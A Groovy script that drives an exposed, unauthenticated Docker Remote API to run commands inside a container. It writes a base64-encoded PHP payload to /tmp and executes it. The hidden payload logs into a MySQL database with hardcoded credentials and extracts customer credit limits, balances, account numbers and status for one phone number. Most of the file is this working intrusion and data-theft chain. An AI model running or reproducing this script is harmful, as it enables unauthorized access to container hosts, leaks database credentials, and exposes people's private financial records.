import groovy.json.JsonSlurper
import groovy.json.JsonOutput

// Direct inline - no closures
def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

// Step 1: test connectivity
def url1 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c1 = url1.openConnection()
c1.setRequestMethod("POST")
c1.setDoOutput(true)
c1.setRequestProperty("Content-Type", "application/json")
c1.setConnectTimeout(5000)
c1.setReadTimeout(20000)
def b1 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["bash", "-c", "which php && hostname && ip route | head -3"]])
c1.outputStream.write(b1.bytes)
c1.outputStream.flush()
def r1 = new JsonSlurper().parseText(c1.inputStream.text)
def eid1 = r1.Id

def su1 = new URL("http://${dHost}:${dPort}/exec/${eid1}/start")
def sc1 = su1.openConnection()
sc1.setRequestMethod("POST")
sc1.setDoOutput(true)
sc1.setRequestProperty("Content-Type", "application/json")
sc1.setConnectTimeout(5000)
sc1.setReadTimeout(20000)
sc1.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc1.outputStream.flush()
println "=== TOOLS ==="
println sc1.inputStream.text

// Step 2: write php file via base64
def phpB64 = "PD9waHAgJGM9bmV3IG15c3FsaSgiMTcyLjI3LjE0MS42IiwiYXBpZmluY2Fkb2RldiIsIjFxMnczZTRyNXQ2eSIsInRpZW5kYSIsMzMwOCk7aWYoJGMtPmNvbm5lY3RfZXJyb3Ipe2RpZSgiRkFJTDoiLiRjLT5jb25uZWN0X2Vycm9yKTt9ZWNobyAiQ09OTkVDVEVEXG4iOyRyPSRjLT5xdWVyeSgiU0VMRUNUIGlkX2NjX2NyZWRjbGllbnRlLGlkX2NsaWVudGUsdGVsZWZvbm8sY3JlZGl0b19kaXNwb25pYmxlLGxpbWl0ZV9jcmVkaXRvLHNhbGRvX2NyZWRpdG8sbnVtZXJvX2N1ZW50YSxlc3RhdHVzIEZST00gY3JlZGl0b19jbGFyb3RlbF9jcmVkY2xpZW50ZSBXSEVSRSB0ZWxlZm9ubyBMSUtFICclNTU1ODQ1NTc3NyUnIik7ZWNobyAiPT09IGNyZWRjbGllbnRlID09PVxuIjtpZigkciYmJHItPm51bV9yb3dzPjApe3doaWxlKCRyb3c9JHItPmZldGNoX2Fzc29jKCkpe2VjaG8gaW1wbG9kZSgifCIsJHJvdykuIlxuIjt9fWVsc2V7ZWNobyAiTk9fUk9XUyBlcnI6Ii4kYy0+ZXJyb3IuIlxuIjt9JHIyPSRjLT5xdWVyeSgiU0VMRUNUIGlkX2NjX2xpbmVhLGlkX2NsaWVudGUsdGVsZWZvbm8sbW9udG9fdG90YWwsbGltaXRlX2NyZWRfdGVsLHNhbGRvX2NyZWRfdGVsLGVzdGFkb19saW5lYSBGUk9NIGNyZWRpdG9fY2xhcm90ZWxfbGluZWFjIFdIRVJFIHRlbGVmb25vIExJS0UgJyU1NTU4NDU1Nzc3JSciKTtlY2hvICI9PT0gbGluZWFjID09PVxuIjtpZigkcjImJiRyMi0+bnVtX3Jvd3M+MCl7d2hpbGUoJHJvdz0kcjItPmZldGNoX2Fzc29jKCkpe2VjaG8gaW1wbG9kZSgifCIsJHJvdykuIlxuIjt9fWVsc2V7ZWNobyAiTk9fUk9XUyBlcnI6Ii4kYy0+ZXJyb3IuIlxuIjt9JGMtPmNsb3NlKCk7Pz4="

def url2 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c2 = url2.openConnection()
c2.setRequestMethod("POST")
c2.setDoOutput(true)
c2.setRequestProperty("Content-Type", "application/json")
c2.setConnectTimeout(5000)
c2.setReadTimeout(20000)
def b2 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["bash", "-c", "echo ${phpB64} | base64 -d > /tmp/tq.php && echo WRITTEN"]])
c2.outputStream.write(b2.bytes)
c2.outputStream.flush()
def r2 = new JsonSlurper().parseText(c2.inputStream.text)
def eid2 = r2.Id

def su2 = new URL("http://${dHost}:${dPort}/exec/${eid2}/start")
def sc2 = su2.openConnection()
sc2.setRequestMethod("POST")
sc2.setDoOutput(true)
sc2.setRequestProperty("Content-Type", "application/json")
sc2.setConnectTimeout(5000)
sc2.setReadTimeout(20000)
sc2.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc2.outputStream.flush()
println "\n=== WRITE ==="
println sc2.inputStream.text

// Step 3: execute PHP
def url3 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c3 = url3.openConnection()
c3.setRequestMethod("POST")
c3.setDoOutput(true)
c3.setRequestProperty("Content-Type", "application/json")
c3.setConnectTimeout(5000)
c3.setReadTimeout(20000)
def b3 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["php", "/tmp/tq.php"]])
c3.outputStream.write(b3.bytes)
c3.outputStream.flush()
def r3 = new JsonSlurper().parseText(c3.inputStream.text)
def eid3 = r3.Id

def su3 = new URL("http://${dHost}:${dPort}/exec/${eid3}/start")
def sc3 = su3.openConnection()
sc3.setRequestMethod("POST")
sc3.setDoOutput(true)
sc3.setRequestProperty("Content-Type", "application/json")
sc3.setConnectTimeout(5000)
sc3.setReadTimeout(20000)
sc3.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc3.outputStream.flush()
println "\n=== RESULT ==="
println sc3.inputStream.text
